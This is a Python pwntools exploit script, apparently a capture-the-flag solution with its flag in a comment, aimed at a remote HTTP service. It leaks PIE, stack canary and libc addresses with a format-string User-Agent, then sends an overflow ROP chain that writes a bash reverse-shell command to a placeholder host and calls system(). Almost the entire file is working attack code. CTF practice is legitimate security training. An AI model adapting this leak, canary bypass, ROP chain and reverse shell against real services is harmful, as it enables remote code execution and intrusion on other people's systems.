#!/usr/bin/env python
from base64 import b64encode as b64e
from pwn import *
import re

# X-MAS{y0u_4r3_a_r3ally_n4ugH7y_bo111}

l = ELF( './libc.so.6' )
#l = ELF( './libc_local' )
context.arch = 'amd64'

host , port = '199.247.6.180' , 10000

def http_request( toy , user_agent ):
    return 'GET /?toy=%s Host: 199.247.6.180:10000\nUser-Agent: %s\n' % ( b64e( toy ) , user_agent )


y = remote( host , port )

y.send( http_request( 'a' * 0x30 , 'AB%p%7$p%37$pEF%11$p' ) )

y.recvuntil( 'AB0x' )
pie = int( y.recvuntil( '0x' )[:-2] , 16 ) - 0x2006
canary = int( y.recvuntil( '0x' )[:-2] , 16 )
#l.address = int( y.recvuntil( 'EF' )[:-2] , 16 ) - 0x2409b
l.address = int( y.recvuntil( 'EF' )[:-2] , 16 ) - 0x202e1
success( 'PIE -> %s\nCanary -> %s\nLibc -> %s' % ( hex( pie ) , hex( canary ) , hex( l.address ) ) )

print y.recvall()
#y.interactive()
y.close()

#pie = 0x555555554000
#canary = 0xa3ab00f74475b200
#l.address = 0x7ffff7dd3000

#pie = 0x55873a5e8000
#canary = 0xd22b7c87cc01de00
#l.address = 0x7fe834bb0000

y = remote( host , port )


pop_rdi = 0x1fc6a
pop_rsi = 0x1fc1a
pop_rax = 0x35578
jmp_rax = 0x20571
mov_rdi_rsi = 0x43a6a

#pop_rdi = 0x23a6f
#pop_rsi = 0x244ce
#pop_rax = 0x44e18
#jmp_rax = 0x243e5
#mov_rdi_rsi = 0x5588a

la = l.address

def store_str( a , s ):
    p = ''
    s = s.ljust( (( len( s ) / 8 ) + 1 ) * 8 , '\x00' )
    print s
    for i in re.findall( '.' * 8 , s ):
        print i
        p += flat(
            la + pop_rdi,
            a,
            la + pop_rsi,
            u64( i ),
            la + mov_rdi_rsi
        )
        a += 8
    return p

p = flat(
    'a' * 0x48,
    canary,
    0,
    store_str( pie + 0x206228 , "bash -c 'bash -i >& /dev/tcp/111.222.333.444/7777 0>&1'" ),
    la + pop_rdi,
    pie + 0x206228,
    l.symbols[ 'system' ],
)

y.send( http_request( p , '' ) )

y.interactive()
